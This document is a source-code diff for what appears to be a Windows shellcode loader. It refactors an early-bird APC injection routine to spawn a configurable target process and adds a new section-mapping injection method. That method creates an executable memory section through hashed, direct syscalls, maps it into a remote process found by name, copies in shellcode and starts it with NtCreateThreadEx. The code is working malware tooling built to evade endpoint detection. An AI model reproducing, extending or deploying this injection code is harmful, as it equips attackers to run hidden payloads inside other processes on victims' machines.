@@ -1,12 +1,12 @@
 #ifdef INJECT_EXTERNAL_EBAPC
 
+#include "../static/vars.hpp"
+#include "../hash/hashes.hpp"
 #include <cstdio>
 #include <vector>
 #include "windows.h"
 #include "../syscall/syscall.hpp"
 #include "../decrypt/decrypt.hpp"
-
-#define SPAWN "c:\\windows\\system32\\SecurityHealthSystray.exe"
 
 EXTERN_C NTSTATUS sysNtOpenProcess(
   PHANDLE ProcessHandle,
@@ -16,15 +16,6 @@ EXTERN_C NTSTATUS sysNtOpenProcess(
 );
 
 int inject(std::vector<unsigned char> bytecode, int ppid) {
-
-  // // ============= HASHES ===============
-  DWORD64 hashNtDll = 3579829573855646769ULL;
-  DWORD64 hashNtOpenProcess = 8162144977058099766ULL;
-  DWORD64 hashNtAllocateVirtualMemory = 9183676357489451690ULL;
-  DWORD64 hashNtWriteVirtualMemory = 13414142115590362032ULL;
-  DWORD64 hashNtProtectVirtualMemory = 5451768839971802726ULL;
-  DWORD64 hashNtQueueApcThread = 9077842422742839126ULL;
-  // // ============= HASHES ===============
 
   unsigned char eSuspendThread[] = {
     0x41, 0x45, 0x53, 0x47, 0x01, 0x10, 0x87, 0x8a, 0x84, 0x6d, 0x52, 0x73,
@@ -103,7 +94,7 @@ int inject(std::vector<unsigned char> bytecode, int ppid) {
 	using CreateProcessAPrototype = BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 	CreateProcessAPrototype CreateProcessA = (CreateProcessAPrototype)GetProcAddress(GetModuleHandleA(win32), sCrP);
 
-	CreateProcessA((LPSTR)SPAWN, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &sie.StartupInfo, &pi);
+	CreateProcessA((LPSTR)TARGET_PROCESS, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &sie.StartupInfo, &pi);
 
 	HANDLE hProcess = pi.hProcess;
 	HANDLE hThread = pi.hThread;
@@ -124,6 +115,194 @@ int inject(std::vector<unsigned char> bytecode, int ppid) {
 
 	return 0;
 
+}
+
+#elifdef INJECT_EXTERNAL_CREATE_MAP_SECTION
+
+#include "../static/vars.hpp"
+#include "../hash/hashes.hpp"
+#include <cstdio>
+#include "../search/findpid.hpp"
+#include "../syscall/syscall.hpp"
+#include <vector>
+#include <windows.h>
+#include "../static/debug.hpp"
+
+EXTERN_C NTSTATUS sysNtCreateSection(
+  PHANDLE            SectionHandle,
+  ACCESS_MASK        DesiredAccess,
+  POBJECT_ATTRIBUTES ObjectAttributes,
+  PLARGE_INTEGER     MaximumSize,
+  ULONG              SectionPageProtection,
+  ULONG              AllocationAttributes,
+  HANDLE             FileHandle
+);
+
+EXTERN_C NTSTATUS sysNtMapViewOfSection(
+  HANDLE          SectionHandle,
+  HANDLE          ProcessHandle,
+  PVOID           *BaseAddress,
+  ULONG_PTR       ZeroBits,
+  SIZE_T          CommitSize,
+  PLARGE_INTEGER  SectionOffset,
+  PSIZE_T         ViewSize,
+  SECTION_INHERIT InheritDisposition,
+  ULONG           AllocationType,
+  ULONG           Win32Protect
+);
+
+EXTERN_C NTSTATUS sysNtCreateThreadEx(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PCOBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE ProcessHandle,
+    PUSER_THREAD_START_ROUTINE StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PPS_ATTRIBUTE_LIST AttributeList
+);
+
+int inject(std::vector<unsigned char> bytecode, int ppid) {
+
+  DEBUG_INFO("Starting injection routine.");
+  DEBUG_INFO("Payload size: %zu bytes", bytecode.size());
+
+  HANDLE hSection = NULL;
+  SIZE_T size = bytecode.size();
+  LARGE_INTEGER sectionMaxSize;
+  sectionMaxSize.QuadPart = size;
+  PVOID localSectionBase = NULL;
+  PVOID remoteSectionBase = NULL;
+
+  // 1. Create an RWX section of `size`
+  DEBUG_INFO("Calling NtCreateSection...");
+  NTSTATUS createSectionStatus = call(
+    hashNtDll,
+    hashNtCreateSection,
+    sysNtCreateSection,
+
+    &hSection,
+    SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
+    nullptr,
+    &sectionMaxSize,
+    PAGE_EXECUTE_READWRITE,
+    SEC_COMMIT,
+    (HANDLE)NULL
+  );
+
+  if (!NT_SUCCESS(createSectionStatus)) {
+      DEBUG_ERR("NtCreateSection failed with NTSTATUS: 0x%lX", createSectionStatus);
+      return -1;
+  }
+  DEBUG_INFO("NtCreateSection successful. Section Handle: %p", hSection);
+
+  HANDLE hCurrentProcess = GetCurrentProcess();
+  DEBUG_INFO("Mapping view of section into the current process address space...");
+  NTSTATUS localMapStatus = call(
+    hashNtDll,
+    hashNtMapViewOfSection,
+    sysNtMapViewOfSection,
+
+    hSection,
+    hCurrentProcess,
+    &localSectionBase,
+    (ULONG_PTR)NULL,
+    (SIZE_T)NULL,
+    (PLARGE_INTEGER)NULL,
+    &size,
+    (SECTION_INHERIT)2,    // ViewUnmap (don't map into any child processes)
+    (ULONG)NULL,
+    PAGE_READWRITE
+  );
+
+  if (!NT_SUCCESS(localMapStatus)) {
+      DEBUG_ERR("Local NtMapViewOfSection failed with NTSTATUS: 0x%lX", localMapStatus);
+      return -1;
+  }
+  DEBUG_INFO("Local map successful. Base Address: %p", localSectionBase);
+
+  // Find target process PID and get a handle
+  DWORD targetProcessId = findProcessId(TARGET_PROCESS);
+  DEBUG_INFO("Target Process: %ls | PID found: %lu", TARGET_PROCESS, targetProcessId);
+
+  if (targetProcessId == 0) {
+      DEBUG_ERR("Failed to find target process.");
+      return -1;
+  }
+
+  DEBUG_INFO("Attempting to open handle to target process...");
+  HANDLE hTargetProcess = OpenProcess(
+    PROCESS_ALL_ACCESS,
+    false,
+    targetProcessId
+  );
+
+  if (hTargetProcess == NULL) {
+      DEBUG_ERR("OpenProcess failed. Error Code: %lu", GetLastError());
+      return -1;
+  }
+  DEBUG_INFO("Target process opened successfully. Handle: %p", hTargetProcess);
+
+  DEBUG_INFO("Mapping view of section into the target process address space (PAGE_EXECUTE_READ)...");
+  NTSTATUS remoteMapStatus = call(
+    hashNtDll,
+    hashNtMapViewOfSection,
+    sysNtMapViewOfSection,
+
+    hSection,
+    hTargetProcess,
+    &remoteSectionBase,
+    (ULONG_PTR)NULL,
+    (SIZE_T)NULL,
+    (PLARGE_INTEGER)NULL,
+    &size,
+    (SECTION_INHERIT)2,
+    (ULONG)NULL,
+    PAGE_EXECUTE_READ
+  );
+
+  if (!NT_SUCCESS(remoteMapStatus)) {
+      DEBUG_ERR("Remote NtMapViewOfSection failed with NTSTATUS: 0x%lX", remoteMapStatus);
+      return -1;
+  }
+  DEBUG_INFO("Remote map successful. Remote Base Address: %p", remoteSectionBase);
+
+  // Copy shellcode to the local view, which will get reflected in the target process's mapped view
+  DEBUG_INFO("Copying bytecode to local section view...");
+  memcpy(localSectionBase, bytecode.data(), bytecode.size());
+  DEBUG_INFO("Bytecode copied successfully.");
+
+  HANDLE hTargetThread = NULL;
+  DEBUG_INFO("Executing shellcode via NtCreateThreadEx in the remote process...");
+  NTSTATUS threadStatus = call(
+    hashNtDll,
+    hashNtCreateThreadEx,
+    sysNtCreateThreadEx,
+
+    &hTargetThread,
+    THREAD_ALL_ACCESS,
+    (PCOBJECT_ATTRIBUTES)NULL,
+    hTargetProcess,
+    (PUSER_THREAD_START_ROUTINE)remoteSectionBase,
+    (PVOID)NULL,
+    0,
+    0,
+    0,
+    0,
+    (PPS_ATTRIBUTE_LIST)NULL
+  );
+
+  if (!NT_SUCCESS(threadStatus)) {
+      DEBUG_ERR("NtCreateThreadEx failed with NTSTATUS: 0x%lX", threadStatus);
+      return -1;
+  }
+  DEBUG_INFO("Thread created successfully! Thread Handle: %p", hTargetThread);
+  DEBUG_INFO("Injection routine completed.");
+
+  return 0;
 }
 
 #endif
